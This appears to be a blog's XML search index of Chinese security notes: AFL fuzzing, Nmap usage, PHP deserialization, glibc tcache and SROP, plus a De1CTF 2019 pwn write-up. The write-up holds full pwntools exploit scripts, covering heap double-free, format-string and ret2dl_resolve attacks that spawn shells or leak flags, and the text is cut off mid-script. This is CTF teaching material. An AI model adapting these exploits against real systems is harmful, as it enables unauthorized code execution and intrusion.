    <content type="text"><![CDATA[概览 首先使用afl-gcc编译项目代码. 将初始testcase放到in目录下. 执行afl-fuzz -i in -o out &lt;program&gt; @@,path为可执行程序路径,@@表示初始用例从文件中读入. 通过out目录(fuzzing结果)分析. 可参考README.txt. 初始测试用例选择 AFL可以有一个或多个包含测试数据的初始文件(testcase). 初始文件大小最好低于1kB. 每个测试用例应该能驱动程序中的不同功能. 常见错误 第一次启动往往会报错,表示某些环境变量没有配置或者配置错误. 没有打开错误转储机制,系统配置为将核心转储文件通知发送到外部程序.将导致将崩溃信息发送到Fuzzer之间的延迟增大,进而可能将崩溃被误报为超时. 12sudo suecho core &gt;/proc/sys/kernel/core_pattern 对代码进行插桩 在使用AFL编译工具afl-gcc对源码进行编译时,程序会使用afl-as工具对编译并未汇编的c/c++代码(.i文件)进行编译插桩,生成汇编文件(.s文件). 1afl-gcc -g -o test test.c 对于项目,重新编译目标程序的配置可能会因不同程序而不同. 12make CC="afl-gcc" CXX="afl-g++"#make CC="afl-clang" CXX="afl-clang++" 当测试lib库的时候,需要从stdin或者从文件读取数据,传入到被测试的lib库中. 可以把被插桩的lib库以静态的方式连接到可执行文件或者确保正确的.so文件在程序运行时加载(通过LD_LIBRARY_PATH). 通常采用静态编译. 1make --disable-shared CC="afl-gcc" CXX="afl-g++" 对没有源代码的程序进行测试要用到AFL的QEMU模式. 因为AFL使用的QEMU版本太旧,util/memfd.c中定义的函数memfd_create()会和glibc中的同名函数冲突. 1234sudo apt-get install libini-config-dev libtool-bin automake bison libglib2.0-devcd qemu_modebuild_qemu_support.shcd .. &amp;&amp; make install 此时就可以添加-Q选项使用QEMU模式进行Fuzzing. fuzzing 对直接从stdin中接收输入的目标二进制程序. 1./afl-fuzz -i in -o out &lt;program&gt; [params] 如果从文件中读取输入,则在指令最后使用@@标记,在实际执行的时候afl-fuzz会把@@替换成测试样本目录in下的测试样本. - -i:指定输入文件夹. - -o:指定输出文件夹. - -f &lt;filename&gt;:将变异过的数据写入指定的文件. - -Q:进入QEMU模式fuzz. - -t &lt;timeout&gt;:设置timeout. - -m &lt;memory limit&gt;:设置memory limit. - -d:使用zzuf和其他传统的模糊测试工具短时间获得较脏的结果. 其中params为被测试程序接受的命令行参数. fuzzing流程. 读取初始in/testcase,将其放入queue中. 从queue中读取内容作为程序输入. 尝试在不影响流程的情况下精简测试用例. 使用算法对输入进行突变. 如果突变后的输入能够有新的状态转移,将其放入queue中. 回到2. 输出解释 从status_screen.txt中可以找到显式界面中各字段的含义,以及监控被测试程序的健康状态. fuzzing进程会一直持续直到按下Ctrl-C. 在输出目录中有三个子目录. queue:每一条不同的执行路径对应的测试用例,包括所有由用户提供的初始化测试用例文件. crashes:能导致被测试程序获得致命信号(如SIGSEGV,SIGILL,SIGABRT等)的唯一性的测试用例.crashes/README.txt保存了目标执行这些crash文件的命令行参数. hangs:能导致被测试程序超时的唯一性测试用例.执行时间限制超过默认的1s或者以-t参数设置的数值之后,当前测试用例就会被记录在这个文件夹下. crashes和hangs的文件名与父节点以及没出错的队列节点相关. 其中还有fuzzer_stats文件记录了afl-fuzz的运行状态,plot_data文件用于afl-plot绘图. 恢复 任何已经存在的output目录对应的工作能被重新恢复. 1./afl-fuzz -i- -o out &lt;program&gt; 触发crash 使程序crash的输入保存在out/crashes目录下. 12xxd out/crashes/id\:000000\,sig\:06\,src\:000000\,op\:havoc\,rep\:16#查看文件的二进制内容 将crash文件用作输入可以使程序崩溃产生core文件,然后gdb core path调试即可. 1./test out/crashes/id\:000000\,sig\:06\,src\:000000\,op\:havoc\,rep\:16 当不能使用afl-fuzz重现crash的时候,最有可能的原因是没有设置相同的内存限制.尝试以下命令. 1LIMIT_MB=50 在以上命令中,更改LIMIT_MB参数与-m参数相匹配. 结束测试 状态窗口中cycles done字段颜色变为绿色该字段的颜色可以作为何时停止测试的参考,随着周期数不断增大,其颜色也会由洋红色,逐步变为黄色,蓝色,绿色. 当其变为绿色时,继续Fuzzing下去也很难有新的发现.或者一旦path covera达到99%就可以中止fuzz. 辅助工具 afl提供了辅助工具帮助更好的进行fuzzing. 语料库蒸馏 语料库层面的最小化就比如之前的favored集合,afl-cmin中的思路类似但更复杂且会将冗余的测试用例删除,找到与语料库全集具有相同覆盖范围的最小子集. 1afl-cmin -i in -o new_in -- &lt;program&gt; [params] 测试用例层面的最小化,其目的是尽可能的移除测试用例中的数据,同时保持目标程序的执行状态不变,对于不产生crash的测试用例可基于前面讨论的插桩技术来判断这些简化操作对目标程序的执行路径是否有影响,afl-tmin.c中所用到的简化操作分为块清零,块移除和字符清零.afl-tmin使用ASCII数字0而不是0x00对块进行归零处理. afl-tmin有两种工作模式,instrumented mode和crash mode.默认的工作方式是instrumented mode. 1afl-tmin -i in -o new_in -- &lt;program&gt; @@ 指定参数-x,即crash mode,会把导致程序非正常退出的文件直接剔除. 1afl-tmin -x -i in -o new_in -- &lt;program&gt; @@ 并行fuzzing AFL支持并行fuzzing,由于每个afl-fuzz例程只占用CPU中的单核,可以同时运行多个fuzzing. 可通过afl-gotcpu工具来获取CPU的使用情况,进而决定增加或减少afl-fuzz例程. 可通过afl-whatsup工具统计各并行例程的结果. 查看机器的核心数. 1cat /proc/cpuinfo | grep "cpu cores" | uniq afl-fuzz并行Fuzzing,一般的做法是通过-M参数指定一个主Fuzzer(Master Fuzzer),通过-S参数指定多个从Fuzzer(Slave Fuzzer). 123afl-fuzz -i in -o out -M fuzzer1 -- &lt;program&gt;afl-fuzz -i in -o out -S fuzzer2 -- &lt;program&gt;afl-fuzz -i in -o out -S fuzzer3 -- &lt;program&gt; fuzz网络程序 afl默认只能fuzz通过stdin和文件获取输入的程序,要fuzz网络相关的程序,需要使用其他库辅助. 这里推荐使用:https://github.com/zardus/preeny.其利用LD_PRELOAD机制,重写了很多库函数,desock.c文件重写了socket相关的函数,其实现的功能就是当应用从socket获取输入时,其实是从stdin获取输入.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-web-tool-Nmap]]></title>
    <url>%2Fposts%2Fb7939715%2F</url>
    <content type="text"><![CDATA[概览 Nmap基本功能:主机发现,端口扫描和服务嗅探,操作系统侦测. nmap端口状态 Open:应用程序在该端口接收TCP连接或者UDP报文. Closed:关闭的端口对于nmap也是可访问的,它接收nmap探测报文并作出响应.但没有应用程序在其上监听. Filtered:由于包过滤阻止探测报文到达端口,nmap无法确定该端口是否开放.过滤可能来自专业的防火墙设备,路由规则或者主机上的软件防火墙. Unfiltered:未被过滤状态意味着端口可访问,但是nmap无法确定它是开放还是关闭.只有用于映射防火墙规则集的ACK扫描才会把端口分类到这个状态. 特殊状态. open|filtered:无法确定端口是开放还是被过滤,开放的端口不响应就是一个例子.没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应.可以换扫描方式继续, closed|filtered:无法确定端口是关闭的还是被过滤的.只会出现在IPID Idle扫描中. 原理 Nmap使用TCP/IP协议栈指纹准确地判断目标主机的操作系统类型. 应用层协议:STMP,FTP,DNS,SNMP,NFS,HTTP,TELNET. 传输层协议:TCP,UDP. 网络层协议:ICMP,IGMP,IP,ARP,RARP. 网络接口层协议:LAN,MAN,WAN. Nmap对目标主机进行一系列的测试,利用测试结果建立相应目标主机的Nmap指纹,然后Nmap会对指纹进行匹配,最终输出相应的结果. 参数与使用 指定目标. xx.xx.xx.a-b:扫描一个C段,或者xx.xx.xx.a/24(或者使用空格隔开),还可以使用--exclude ip [ip2 ...]排除ip. -iL &lt;file&gt;:扫描文件中所有ip. -iR count:随机选取count个ip进行扫描. 常用参数. -A:全面扫描指定IP或域名的所有端口及其目标系统信息等. -sn:Ping Scan只进行主机发现,不进行端口扫描. -sP:ping扫描.默认情况发送一个ICMP回声请求和一个TCP报文到目标端口. -P0:无ping扫描.可以躲避某些防火墙的防护. -Pn:即使没收到ping应答仍进行扫描. -PS/PA/PU/PY[portlist]:使用TCP SYN Ping/TCP ACK Ping/UDP Ping/SCTP INIT Ping扫描. -PE/PP/PM:ICMP Ping Types扫描. -PR:ARP Ping扫描. -n:禁止DNS反向解析. -R:反向解析域名. --system-dns:使用系统域名解析器. -sL:列表扫描. -6:扫描IPv6地址. --traceroute:路由追踪. --packet-trace:网络包追踪. -T[n]:时序选项.n = 0-5,0和1非常慢,常用于IDS逃避.3为默认,4为快速扫描. -p:指定端口范围,-p1-65535 == -p-.默认不扫描所有端口,不加-p时,显示的都是已知协议的端口,对于未知协议的端口没显示. -F:快速扫描有限的端口(具体范围为nmap-services文件定义). --scanflags:自定义TCP扫描.通过数字标记值或者字符名来设置报文标志位. -sS:TCP同步扫描(TCP SYN).也称为半开扫描.相对较隐蔽且能区分出端口的开放状态. -sT:TCP connect()扫描,容易被检测. -sU:UDP端口扫描.能区分出端口的开放状态但扫描非常慢. -sR:RPC扫描.此方法可以和nmap的其它不同的端口扫描方法结合使用.选择所有处于打开状态的端口向它们发出SunRPC程序的NULL命令,以确定它们是否是RPC端口. -sN:空(Null)扫描模式. -sF:秘密FIN数据包扫描.使用暴露的FIN数据包来探测. -sX:Xmas扫描.打开数据包的FIN,URG和PUSH标志.如果端口开放则会响应RST标志包. -sA:ACK扫描.向特定的端口发送ACK包(使用随机的应答/序列号).如果返回一个RST包,就标记为unfiltered.如果没有返回或者返回一个不可达ICMP消息,就归入filtered. -sW:对滑动窗口的扫描.通过检测返回的RST报文的TCP窗口域判断目标端口是否开放.为0表示未开放. -sM:TCP Maimon扫描.与-sX/F/N类似. -sI &lt;host:port&gt;:空闲扫描.一种端口完全欺骗扫描,利用不活跃的僵尸主机反弹一个旁通信道进行端口扫描. -sO:IP协议扫描.用于扫描目标主机开放IP协议类型. -sV:版本检测. --allports:全端口版本检测. --version-intensity:0~9,设置版本检测的强度.越大成功率越高.--version-light == --version-intensity 2.--version-all == --version-intensity 9. --version-trace:获取详细版本信息. -sC:脚本扫描. -b:FTP Bounce扫描. -O:OS检测. --osscan-limit:只对具有打开和关闭的端口的主机进行操作系统检测.配合-O或-A. -v:显示冗余(verbosity)信息. -oX:生成xml形式的扫描报告. 控制参数. --min-hostgroup/max:调整并行扫描组的最小值/最大值. --min-parallelism/max:调整探测报文的最小/最大并行度. --min-rrt-timeout/max/initial 100ms:单位为ms,调整探测报文超时. --host-timeout:调整一个主机的超时阈值,从而放弃缓慢主机. --scan-delay/--max-scan-delay:调整探测报文的时间间隔. Nmap NSE脚本 123456cd /usr/share/nmap/scripts/git clone https://github.com/vulnersCom/nmap-vulners.gitgit clone https://github.com/scipag/vulscan.gitcd vulscan/utilities/updater/chmod +x updateFiles.sh./updateFiles.sh 使用Nmap-Vulners进行扫描. 1nmap --script nmap-vulners -sV &lt;IP&gt; 使用Vulscan进行扫描. 1234nmap --script vulscan -sV &lt;IP&gt;nmap --script vulscan --script-args vulscandb=database_name -sV &lt;IP&gt;# 指定漏洞库 例子. 1nmap --script nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv -sV &lt;IP&gt; Nmap还有自带的脚本. auth:负责处理鉴权证书(绕开鉴权). broadcast:在局域网内探查更多服务开启状况,如dhcp/dns/sqlserver等服务. brute:提供暴力破解方式,针对常见的应用如http/snmp等. default:使用-sC或-A选项扫描时候默认的脚本,提供基本脚本扫描能力. discovery:对网络进行更多的信息,如SMB枚举,SNMP查询等. dos:用于进行拒绝服务攻击. exploit:利用已知的漏洞入侵系统. external:利用第三方的数据库或资源,例如进行whois解析. fuzzer:模糊测试的脚本,发送异常的包到目标机,探测出潜在漏洞. intrusive:入侵性的脚本,此类脚本可能引发对方的IDS/IPS的记录或屏蔽. malware:探测目标机是否感染了病毒,开启了后门等信息. safe:此类与intrusive相反,属于安全性脚本. version:负责增强服务与版本扫描(Version Detection)功能的脚本. vuln:负责检查目标机是否有常见的漏洞(Vulnerability),如是否有MS08_067.]]></content>
      <categories>
        <category>IS</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-web-PHP-反序列化漏洞]]></title>
    <url>%2Fposts%2Fadce06cd%2F</url>
    <content type="text"><![CDATA[概览 PHP反序列化漏洞又称对象注入,可能会导致远程代码执行(RCE).漏洞为执行unserialize函数,调用某一类并执行魔术方法(magic method),之后可以执行类中函数,产生安全问题. 漏洞的前提:unserialize函数的参数可控;PHP文件中存在可利用的类,类中有魔术方法; unserialize unserialize. unserialize以一个被序列化的变量(即字符串)为参数,将其转换回序列化之前的值. 12345678910111213&lt;?php class User &#123; public $age = 0; public $name = ''; public function PrintData() &#123; echo 'User ' . $this-&gt;name . ' is ' . $this-&gt;age . ' years old. &lt;br /&gt;'; &#125; &#125; $usr = unserialize('O:4:"User":2:&#123;s:3:"age";i:20;s:4:"name";s:4:"John";&#125;'); $usr-&gt;PrintData();?&gt;//User John is 20 years old 通常通过本地生成一个对象并序列化(serialize)获得序列化后的字符串,可能存在不可见字符,通过urlencode函数转化. Magic function PHP中有一类特殊的方法叫Magic function,下面是unserialize时可利用的Magic function. __destruct():当对象被销毁时会自动调用. __wakeup():unserialize()时会自动调用.]]></content>
      <categories>
        <category>IS</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-RTFSC-Linux-glibc-2.27-tcache]]></title>
    <url>%2Fposts%2F19fbe7cf%2F</url>
    <content type="text"><![CDATA[前言 基于glibc-2.27. 对应结构体 tcache_entry.类似于fastbin,tcache也是以单向链表连接. 初始化时会分配多个tcache_entry在最开始的堆块用于管理tcache chunk. 123typedef struct tcache_entry &#123; struct tcache_entry *next;&#125; tcache_entry; tcache_perthread_struct.每个线程使用一个tcache_perthread_struct管理当前线程的tcache. 1234typedef struct tcache_perthread_struct &#123; char counts[TCACHE_MAX_BINS];//记录对应单向链表保存的tcache的数量,默认最大值为7 tcache_entry *entries[TCACHE_MAX_BINS];//对应的单向链表&#125; tcache_perthread_struct; 与fastbin不同的是tcache的next指向user data的地方,即chunk header之后. tcache的分配与释放简述 free内存时,如果size小于small bin size时,chunk会先放到对应的tcache中,直到tcache被填满.tcache中的chunk不会合并(不取消inuse bit). malloc内存时,如果size在tcache范围内,先从tcache取chunk,直到tcache为空后从bin中找. tcache为空时,如果fastbin/smallbin/unsorted bin中有size符合的chunk,会先把fastbin/smallbin/unsorted bin中的chunk放到tcache中,直到填满.之后再从tcache中取. source code 主要分析malloc与free在tcache机制后的改变. __libc_malloc __libc_malloc. 1234567891011121314151617void * __libc_malloc (size_t bytes)&#123; /* code */#if USE_TCACHE size_t tbytes; checked_request2size (bytes, tbytes); size_t tc_idx = csize2tidx (tbytes); MAYBE_INIT_TCACHE (); DIAG_PUSH_NEEDS_COMMENT; if (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) &#123; return tcache_get (tc_idx); &#125; DIAG_POP_NEEDS_COMMENT;#endif /* code */&#125; MAYBE_INIT_TCACHE. 123# define MAYBE_INIT_TCACHE() \ if (__glibc_unlikely (tcache == NULL)) \ tcache_init(); tcache_init. 1234567891011121314151617181920212223static void tcache_init(void) &#123; mstate ar_ptr; void *victim = 0; const size_t bytes = sizeof (tcache_perthread_struct); if (tcache_shutting_down) return; arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); if (!victim &amp;&amp; ar_ptr != NULL) &#123; ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) __libc_lock_unlock (ar_ptr-&gt;mutex); if (victim) &#123; tcache = (tcache_perthread_struct *) victim; memset (tcache, 0, sizeof (tcache_perthread_struct)); &#125;&#125; tcache_get(). 12345678static __always_inline void * tcache_get (size_t tc_idx)c&#123; tcache_entry *e = tcache-&gt;entries[tc_idx]; assert (tc_idx &lt; TCACHE_MAX_BINS); assert (tcache-&gt;entries[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]); return (void *) e;&#125; __libc_free __libc_free无太大变化. 123456void __libc_free (void *mem) &#123; /* code */ MAYBE_INIT_TCACHE (); ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, 0);&#125; _int_free. 12345678910111213static void _int_free (mstate av, mchunkptr p, int have_lock) &#123; /* code */#if USE_TCACHE &#123; size_t tc_idx = csize2tidx (size); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (p, tc_idx); return; &#125; &#125;#endif /* code */&#125; tcache_put. 1234567static __always_inline void tcache_put (mchunkptr chunk, size_t tc_idx) &#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);&#125;]]></content>
      <categories>
        <category>CS</category>
        <category>RTFSC</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Linux-srop]]></title>
    <url>%2Fposts%2F8c0ed81a%2F</url>
    <content type="text"><![CDATA[概览 SROP(Sigreturn Oriented Programming),即利用Linux信号处理完成的rop攻击. Linux信号处理 当内核向某个进程发起一个signal,该进程会被暂时挂起,进入内核,然后内核为该进程保存相应的上下文,跳转到之前注册好的signal handler中处理相应signal,当signal handler返回之后,内核为该进程恢复之前保存的上下文,最后恢复进程的执行. 如何使得用户态的signal handler执行完成之后能够顺利返回内核态是关键.在类UNIX的各种不同的系统中,这个过程有些许的区别,但是大致过程是一样的. 以Linux为例,在第二步的时候,内核会帮用户进程将其上下文(signal frame)保存在该进程的栈上,然后在栈顶填上一个地址rt_sigreturn,这个地址指向一段代码,在这段代码中会调用rt_sigreturn系统调用.因此,当signal handler执行完之后,最后一条ret指令会使得执行流跳转到这段rt_sigreturn代码,被动地进行rt_sigreturn系统调用. 在内核rt_sigreturn系统调用处理函数中,会根据当前的栈指针指向的Signal Frame对进程上下文进行恢复,并返回用户态,从挂起点恢复执行. 32位的signal frame实现. 12345678910111213141516171819202122232425struct sigcontext&#123; unsigned short gs, __gsh; unsigned short fs, __fsh; unsigned short es, __esh; unsigned short ds, __dsh; unsigned long edi; unsigned long esi; unsigned long ebp; unsigned long esp; unsigned long ebx; unsigned long edx; unsigned long ecx; unsigned long eax; unsigned long trapno; unsigned long err; unsigned long eip; unsigned short cs, __csh; unsigned long eflags; unsigned long esp_at_signal; unsigned short ss, __ssh; struct _fpstate * fpstate; unsigned long oldmask; unsigned long cr2;&#125;; 64位的signal frame实现. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152typedef struct ucontext&#123; unsigned long int uc_flags; struct ucontext *uc_link; __sigset_t uc_sigmask; stack_t uc_stack; mcontext_t uc_mcontext; long int uc_filler[5];&#125; ucontext_t;typedef struct sigaltstack&#123; __ptr_t ss_sp; size_t ss_size; int ss_flags;&#125; stack_t;struct sigcontext&#123; __uint64_t r8; __uint64_t r9; __uint64_t r10; __uint64_t r11; __uint64_t r12; __uint64_t r13; __uint64_t r14; __uint64_t r15; __uint64_t rdi; __uint64_t rsi; __uint64_t rbp; __uint64_t rbx; __uint64_t rdx; __uint64_t rax; __uint64_t rcx; __uint64_t rsp; __uint64_t rip; __uint64_t eflags; unsigned short cs; unsigned short gs; unsigned short fs; unsigned short __pad0; __uint64_t err; __uint64_t trapno; __uint64_t oldmask; __uint64_t cr2; __extension__ union &#123; struct _fpstate * fpstate; __uint64_t __fpstate_word; &#125;; __uint64_t __reserved1 [8];&#125;; 利用 假设攻击者可以控制用户进程的栈,那么就可以伪造一个Signal Frame. 一旦rt_sigreturn执行,就会去执行execve系统调用. 攻击者除了可以控制用户进程的栈,还需要知道syscall指令和rt_sigreturn系统调用在内存中的地址.在不同的类UNIX系统中,这些系统调用会出现在不同的位置. 或者通过syscall调用rt_sigreturn. x86环境下vDSO只有一字节是random,也就是1/256的命中率,范围为0xf7700000 ~ 0xf7800000. pwnlib.rop.srop pwntools集成了SROP的利用工具,直接使用类SigreturnFrame构造Signal Frame. 类SigreturnFrame的结构和初始化的值因为系统与程序的不同会有所不同.i386 on i386,i386 on amd64,amd64 on amd64. 123456789context.arch = 'i386'SigreturnFrame(kernel = 'i386')#i386 on i386context.arch = 'i386'SigreturnFrame(kernel = 'amd64')#i386 on amd64context.arch = 'amd64'SigreturnFrame(kernel = 'amd64')#amd64 on amd64 利用SROP构造系统调用串 只需要再额外添加一个对栈指针rsp的控制即可.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-de1ctf-2019-pwn]]></title>
    <url>%2Fposts%2Ff9ab6241%2F</url>
    <content type="text"><![CDATA[weapon 首先double free配合fastbin attack造成堆溢出.修改chunk_size释放获得unsorted bin. 恢复chunk_size进行1/16几率的_IO_2_1_stdout_地址爆破,分配成功即爆破成功. 攻击_IO_2_1_stdout_泄露libc地址,再次double free修改malloc_hook为one_gadget获得shell. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *context(os = "linux", arch = "amd64")libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')#context.log_level = 'debug'def create(index, size, content): r.sendline('1') r.sendlineafter('size of weapon: ', str(size)) r.sendlineafter('input index: ', str(index)) r.sendafter('your name:\n', content) r.recvuntil('choice &gt;&gt; \n')def delete(index): r.sendline('2') r.sendlineafter('input idx :', str(index)) r.recvuntil('choice &gt;&gt; \n')def rename(index, content): r.sendline('3') r.sendlineafter('input idx: ', str(index)) r.sendafter('new content:\n', content) data = r.recvuntil('choice &gt;&gt; \n') return data#r = process('./pwn')r = remote("139.180.216.34", "8888")r.recvuntil('choice &gt;&gt; \n')create(0, 0x60, "a")create(1, 0x60, "a")create(2, 0x60, "a")create(9, 0x10, "a")delete(0)delete(1)delete(0)create(0, 0x60, p8(0x60))create(1, 0x60, "a")create(0, 0x60, p64(0) * 11 + p64(0x71))create(3, 0x60, p64(0) + p64(0xe1))delete(1)rename(3, p64(0) + p64(0x71))delete(0)delete(2)delete(0)create(0, 0x60, p8(0x70))create(2, 0x60, "a")create(0, 0x60, "a")rename(1, p8(0xdd) + p8(0x95))create(1, 0x60, "a")r.sendline('1')r.sendlineafter('size of weapon: ', str(0x60))r.sendlineafter('input index: ', str(4))r.sendafter('your name:\n', p8(0) * 3 + p64(0) * 6 + p64(0xfbad3887) + p64(0) * 3 + p8(0x88))libc = u64(r.recv()[:8]) - libc.symbols['_IO_2_1_stdin_']print "libc: " + hex(libc)delete(0)delete(2)delete(0)create(0, 0x60, p64(libc + 0x3c4b10 - 0x23))create(2, 0x60, "a")create(0, 0x60, "a")create(5, 0x60, "0" * 0x13 + p64(libc + 0xf02a4))#gdb.attach(r)delete(9)r.sendline('2')r.sendlineafter('input idx :', str(9))r.interactive() unprintable exit函数会调用__run_exit_handlers,__run_exit_handlers函数又会调用dl_fini函数. 1&lt;_dl_fini+819&gt;: call QWORD PTR [r12+rdx*8] rdx固定为0,r12来自下面的代码片段. 1234&lt;_dl_fini+777&gt;: mov r12,QWORD PTR [rax+0x8];r12 = 0x600dd8&lt;_dl_fini+781&gt;: mov rax,QWORD PTR [rbx+0x120]&lt;_dl_fini+788&gt;: add r12,QWORD PTR [rbx] rbx的值为一个指针,该指针在printf执行的栈上存在,可以控制([rbx] = target_ptr - 0x600dd8). 控制其跳到0x4007A3,可发现这次栈上有一个指针指向printf的返回地址.这样就可以循环利用printf写. 此时可以写栈上数据并利用pop esp;...;ret;栈迁移后就可以rop了. 由于没有泄露,需要寻找一些加法gadget和程序中原有的libc地址(由于程序开了Full RELRO所以这里找到了stderr). 120x00000000004006e8 : adc [rbp+48h], edx#__do_global_dtors_aux + 8 再利用__libc_csu_init中的gadget就可以getshell. 10x0000000000400819 : call qword ptr [r12+rbx*8] 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *context.log_level = 'debug'adc = 0x4006E8mmm_call = 0x400810pop_rsp_ppp_ret = 0x40082dpop_rbx_ppppp_ret = 0x40082Ar = process("./unprintable")r.recvuntil("your gift: ")stack = int(r.recvuntil("\n"), 16)payload = "%" + str(0x601100 - 0x600dd8) + "c%26$n"payload = payload.ljust(0xa0, "\x00")payload += p64(0x4007A3)r.send(payload)sleep(1)offset = (stack % 0x10000 - 0x118) % 0x100if offset &lt; 0xA3: payload = "%" + str(offset) + "c%18$hhn" + "%" + str(0xA3 - offset) + "c%23$hhn"elif offset == 0xA3: payload = "%" + str(offset) + "c%18$hhn%23$hhn"else: payload = "%" + str(0xA3) + "c%23$hhn" + "%" + str(offset - 0xA3) + "c%18$hhn"payload += "\x00"r.send(payload)sleep(1)offset = 0x1100if offset &lt; 0xA3: payload = "%" + str(offset) + "c%13$lln" + "%" + str(0xA3 - offset) + "c%23$hhn"elif offset == 0xA3: payload = "%" + str(offset) + "c%13$lln%23$hhn"else: payload = "%" + str(0xA3) + "c%23$hhn" + "%" + str(offset - 0xA3) + "c%13$lln"payload += "\x00"r.send(payload)sleep(1)offset = (stack % 0x10000 - 0x116) % 0x100if offset &lt; 0xA3: payload = "%" + str(offset) + "c%18$hhn" + "%" + str(0xA3 - offset) + "c%23$hhn"elif offset == 0xA3: payload = "%" + str(offset) + "c%18$hhn%23$hhn"else: payload = "%" + str(0xA3) + "c%23$hhn" + "%" + str(offset - 0xA3) + "c%18$hhn"payload += "\x00"r.send(payload)#gdb.attach(r, "b * 0x4006E8")sleep(1)offset = 0x60if offset &lt; 0x82d: payload = "%" + str(offset) + "c%13$hhn" + "%" + str(0x82d - offset) + "c%23$hn"elif offset == 0x82d: payload = "%" + str(offset) + "c%13$hhn%23$hn"else: payload = "%" + str(0x82d) + "c%23$hn" + "%" + str(offset - 0x82d) + "c%13$hhn"payload += "\x00"payload = payload.ljust(0xa0, "\x00")payload += p64(0) * 3payload += p64(pop_rbx_ppppp_ret) + p64(0) + p64(0x601040 - 0x48) + p64(0x601200) + p64(0xffd2bc07) + p64(0) + p64(0)payload += p64(mmm_call)payload += p64(pop_rbx_ppppp_ret) + p64(0) + p64(0) + p64(0x601040) + p64(0) + p64(0) + p64(0)payload += p64(0x400819)payload = payload.ljust(0x1a0, "\x00")payload += p64(adc)r.send(payload)print "stack: " + hex(stack)r.interactive() 由于stdout被close,这里使用cat flag &gt;&amp; 2. mimic_note 通过unlink获取32位的任意读写,劫持got表然后利用一个gadget,将栈转移到bss段上面ROP,这个时候利用ret2dl_resolve就可以调用open(flag),然后写到某个note里面,那个note提前设好一个值,假如不相当的话,就会输出what are you trying to do?.通过这样爆破出flag. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100from pwn import *def ret2dl_resolve_x86(path, stage, func, resolve_target): elf = ELF(path) plt0 = elf.get_section_by_name('.plt').header.sh_addr jmprel = elf.dynamic_value_by_tag("DT_JMPREL")#rel_plt relent = elf.dynamic_value_by_tag("DT_RELENT")#size of jmprel struct symtab = elf.dynamic_value_by_tag("DT_SYMTAB")#dynsym syment = elf.dynamic_value_by_tag("DT_SYMENT")#size of symtab strtab = elf.dynamic_value_by_tag("DT_STRTAB")#dynstr versym = elf.dynamic_value_by_tag("DT_VERSYM")#version padlen = syment - ((stage - symtab) % syment) fake_addr_sym = stage + padlen fake_symbol_index = (fake_addr_sym - symtab) / syment while True: ndx = u16(elf.read(versym + fake_symbol_index * 2, 2)) if ndx != 0: fake_symbol_index += 1 continue else: break fake_addr_sym = symtab + fake_symbol_index * syment sym_padlen = fake_addr_sym - stage stage = fake_addr_sym + syment padlen = relent - ((stage - jmprel) % relent) fake_addr_reloc = stage + padlen padlen_reloc = padlen fake_addr_symstr = fake_addr_reloc + relent r_info = (((fake_addr_sym - symtab) / syment) &lt;&lt; 8) | 0x7 fake_st_name = fake_addr_symstr - strtab resolve_data = "S" * sym_padlen resolve_data += struct.pack('&lt;IIII', fake_st_name, 0, 0, 0x12)#Elf32_Sym resolve_data += "S" * padlen_reloc resolve_data += struct.pack('&lt;II', resolve_target, r_info)#Elf32_Rel resolve_data += func fake_reloc_offset = fake_addr_reloc - jmprel resovle_call = p32(plt0) + p32(fake_reloc_offset) return resolve_data, resovle_calldef add(size): r.sendlineafter("&gt;&gt; ", "1") r.sendlineafter("size?", str(size))def delete(index): r.sendlineafter("&gt;&gt; ", "2") r.sendlineafter("index ?\n", str(index))def show(index): r.sendlineafter("&gt;&gt; ", "3") r.sendlineafter("index ?\n", str(index)) data = r.recvline()[:-1] return datadef edit(index, content): r.sendlineafter("&gt;&gt; ", "4") r.sendlineafter("index ?\n", str(index)) r.sendafter("content?\n", content)pop_edi_ebp_ret = 0x080489fabss = 0x0804a600r = process("./mimic")#r = process("./mimic_note_32")#r = process("./mimic_note_64")#gdb.attach(r)add(0xfc)add(0xfc)edit(0, p32(0) + p32(0xf9) + p32(0x804A060 - 0xc) + p32(0x804A060 - 0x8) + p64(0) * 0x1d + p32(0xf8))delete(1)add(0x300)add(0x300)edit(0, "\x00" * 0xc + p32(bss + 0x300) + p32(0x100) + p32(0x804A014) + p32(0x100) + p32(bss) + p32(0x800) + p32(bss) + p32(0x800))edit(0, "flag&#123;")edit(1, p32(pop_edi_ebp_ret) + p32(bss))data, call = ret2dl_resolve_x86("./mimic_note_32", bss + 0x100, "open", 0x804A014)payload = p32(0) + call + 